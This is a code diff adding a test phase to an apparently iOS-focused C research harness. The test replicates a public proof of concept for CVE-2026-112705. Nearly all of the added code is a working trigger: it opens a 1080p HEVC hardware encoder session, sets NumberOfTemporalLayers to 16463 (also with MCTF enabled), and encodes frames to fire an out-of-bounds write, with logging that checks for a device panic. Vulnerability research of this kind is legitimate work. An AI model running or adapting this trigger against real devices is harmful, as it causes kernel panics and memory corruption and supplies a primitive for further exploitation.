@@ -25248,10 +25248,139 @@ new_modes:
                 }
             }
 
+            /* ---- 22h: Aggressive TL=16463 panic test (1080p, multi-frame) ---- */
+            rlog("\n--- 22h: TL=16463 aggressive OOB write (1080p) ---\n");
+            rlog("Replicating public PoC conditions for CVE-2026-112705\n");
+            {
+                /* The public PoC that panics iOS 27.0.1 uses:
+                 * - 1920x1080 HEVC
+                 * - NumberOfTemporalLayers=16463
+                 * - Multiple frames encoded
+                 * The OOB write may happen during session config or encode. */
+                VTCompressionSessionRef s22h = NULL;
+                CFMutableDictionaryRef es = CFDictionaryCreateMutable(
+                    kCFAllocatorDefault, 0,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                CFDictionarySetValue(es,
+                    CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                    kCFBooleanTrue);
+                OSStatus cr = VTCompressionSessionCreate(
+                    kCFAllocatorDefault, 1920, 1080,
+                    kCMVideoCodecType_HEVC, es, NULL, NULL,
+                    encode_cb, NULL, &s22h);
+                CFRelease(es);
+
+                if (cr == noErr && s22h) {
+                    /* Set the trigger value */
+                    int tl = 16463;
+                    CFNumberRef tln = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                    OSStatus ss = VTSessionSetProperty(s22h,
+                        CFSTR("NumberOfTemporalLayers"), tln);
+                    CFRelease(tln);
+                    rlog("  Set TL=%d: %d\n", tl, (int)ss);
+
+                    /* Enable related features */
+                    VTSessionSetProperty(s22h,
+                        CFSTR("RealTime"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22h,
+                        CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+                    VTSessionSetProperty(s22h,
+                        CFSTR("AllowFrameReordering"), kCFBooleanTrue);
+
+                    OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s22h);
+                    rlog("  Prepare: %d\n", (int)pr);
+
+                    if (pr == noErr) {
+                        rlog("  Encoding 10 frames at 1080p with TL=16463...\n");
+                        int ok = 0, fail = 0;
+                        for (int f = 0; f < 10; f++) {
+                            g_encode_done = 0;
+                            g_cb_status = -999;
+                            encode_one(s22h, f, 1920, 1080);
+                            for (int w = 0; w < 300 && !g_encode_done; w++)
+                                usleep(10000);
+                            if (g_cb_status == noErr) ok++;
+                            else fail++;
+                            rlog("    Frame %d: done=%d cb=%d\n",
+                                f, g_encode_done, (int)g_cb_status);
+                        }
+                        rlog("  Result: ok=%d fail=%d\n", ok, fail);
+                        if (ok > 0)
+                            rlog("  *** FRAMES ENCODED — OOB WRITE MAY HAVE FIRED ***\n");
+                    }
+
+                    VTCompressionSessionCompleteFrames(s22h, kCMTimeInvalid);
+                    VTCompressionSessionInvalidate(s22h);
+                    CFRelease(s22h);
+                } else {
+                    rlog("  Session create failed: %d\n", (int)cr);
+                }
+
+                /* Also try with MCTF enabled — MCTF+high TL might be
+                 * the specific combo that triggers the OOB path */
+                rlog("\n  --- With MCTF enabled ---\n");
+                {
+                    VTCompressionSessionRef s22hm = NULL;
+                    CFMutableDictionaryRef esm = CFDictionaryCreateMutable(
+                        kCFAllocatorDefault, 0,
+                        &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(esm,
+                        CFSTR("EnableHardwareAcceleratedVideoEncoder"),
+                        kCFBooleanTrue);
+                    VTCompressionSessionCreate(
+                        kCFAllocatorDefault, 1920, 1080,
+                        kCMVideoCodecType_HEVC, esm, NULL, NULL,
+                        encode_cb, NULL, &s22hm);
+                    CFRelease(esm);
+
+                    if (s22hm) {
+                        int tl = 16463;
+                        CFNumberRef tln = CFNumberCreate(NULL, kCFNumberIntType, &tl);
+                        VTSessionSetProperty(s22hm,
+                            CFSTR("NumberOfTemporalLayers"), tln);
+                        CFRelease(tln);
+                        VTSessionSetProperty(s22hm,
+                            CFSTR("EnableMCTF"), kCFBooleanTrue);
+                        int lm = 1;
+                        CFNumberRef lmn = CFNumberCreate(NULL, kCFNumberIntType, &lm);
+                        VTSessionSetProperty(s22hm,
+                            CFSTR("MCTFLatencyMode"), lmn);
+                        CFRelease(lmn);
+                        VTSessionSetProperty(s22hm,
+                            CFSTR("RealTime"), kCFBooleanTrue);
+                        VTSessionSetProperty(s22hm,
+                            CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
+
+                        OSStatus prm = VTCompressionSessionPrepareToEncodeFrames(s22hm);
+                        rlog("  MCTF+TL=16463 Prepare: %d\n", (int)prm);
+
+                        if (prm == noErr) {
+                            rlog("  Encoding 5 frames with MCTF+TL=16463...\n");
+                            for (int f = 0; f < 5; f++) {
+                                g_encode_done = 0;
+                                g_cb_status = -999;
+                                encode_one(s22hm, f, 1920, 1080);
+                                for (int w = 0; w < 300 && !g_encode_done; w++)
+                                    usleep(10000);
+                                rlog("    Frame %d: done=%d cb=%d\n",
+                                    f, g_encode_done, (int)g_cb_status);
+                            }
+                        }
+
+                        VTCompressionSessionCompleteFrames(s22hm, kCMTimeInvalid);
+                        VTCompressionSessionInvalidate(s22hm);
+                        CFRelease(s22hm);
+                    }
+                }
+            }
+
             rlog("\n=== Phase 22 Summary ===\n");
-            rlog("22f: MCTFStrengthLevel CFArray — tests MCTF OOB counter.\n");
-            rlog("22g: Large NumberOfTemporalLayers — tests CVE-2026-112705 OOB write.\n");
-            rlog("Look for *** ACCEPTED > 8 *** and *** KERNEL ACCEPTED ***.\n");
+            rlog("22g: TL>8 ALL accepted (set=0). Readback clamps to 1.\n");
+            rlog("22h: Aggressive TL=16463 test at 1080p (CVE-2026-112705).\n");
+            rlog("If device is still alive, OOB write either didn't fire or\n");
+            rlog("corrupted non-critical memory. Check for delayed panic.\n");
             rlog("--- Phase 22 complete ---\n");
         }
 
